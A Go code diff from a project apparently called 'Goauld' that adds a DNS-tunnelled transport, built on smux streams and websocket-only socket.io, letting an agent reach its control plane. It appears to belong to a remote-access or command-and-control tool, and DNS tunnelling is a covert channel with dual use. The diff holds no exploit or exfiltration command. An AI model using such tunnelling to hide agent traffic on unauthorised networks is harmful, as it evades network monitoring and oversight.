@@ -9,12 +9,14 @@ import (
 	"errors"
 	"fmt"
 	"net"
+	"strings"
 	"time"
 
 	"Goauld/agent/config"
 	"Goauld/common/log"
 
 	socketio "Goauld/common/socket.io"
+	"github.com/xtaci/smux"
 
 	sio "github.com/hazegard/socket.io-go"
 	eio "github.com/hazegard/socket.io-go/engine.io"
@@ -92,6 +94,24 @@ func (cpc *ControlPlanClient) InitWsUpgrade(success chan<- struct{}, chanErr cha
 // InitPolling tries to connect to the control plan using the HTTP long polling transport.
 func (cpc *ControlPlanClient) InitPolling(success chan<- struct{}, chanErr chan<- error) error {
 	cfg := getEioConfig([]string{"polling"})
+
+	return cpc.init(cfg, success, chanErr)
+}
+
+// InitOverDNS tries to connect to the control plan using the DNS transport.
+func (cpc *ControlPlanClient) InitOverDNS(session *smux.Stream, success chan<- struct{}, chanErr chan<- error) error {
+	_, err := session.Write([]byte(config.Get().ID))
+	// DNS MODE means we are using http to simplify the exchanges
+	u := strings.TrimPrefix(strings.TrimPrefix(config.Get().SocketIoURL(config.Get().ID), "https://"), "http://")
+	cpc.url = "http://" + u
+	if err != nil {
+		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
+	}
+	_, err = session.Write([]byte{'C'})
+	if err != nil {
+		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
+	}
+	cfg := getDNSEioConfig(session)
 
 	return cpc.init(cfg, success, chanErr)
 }
@@ -222,6 +242,26 @@ func getEioConfig(tr []string) *sio.ManagerConfig {
 				HTTPHeader: proxy.NewHeaderMap(),
 			},
 			Transports: tr,
+		},
+	}
+}
+
+// getEioConfig return the socket.io underlying configuration.
+func getDNSEioConfig(session *smux.Stream) *sio.ManagerConfig {
+	return &sio.ManagerConfig{
+		EIO: eio.ClientConfig{
+			UpgradeDone: func(transportName string) {
+				log.Trace().Str("Transport", transportName).Msg("Client transport upgrade done")
+			},
+			HTTPTransport: NewSmuxTransport(session),
+			WebSocketDialOptions: &websocket.DialOptions{
+				HTTPClient: newSmuxHTTPandHTTPSClient(session),
+			},
+			// When tunneling over DNS, if we use polling only or polling then websocket upgrade,
+			// The tunnel fails to establish properly as the server responds to unwanted content to the open HTTP socket.
+			// Here we use the full duplex websocket mechanism to ensure that the tunnel is properly working
+			// On the client side
+			Transports: []string{"websocket"},
 		},
 	}
 }
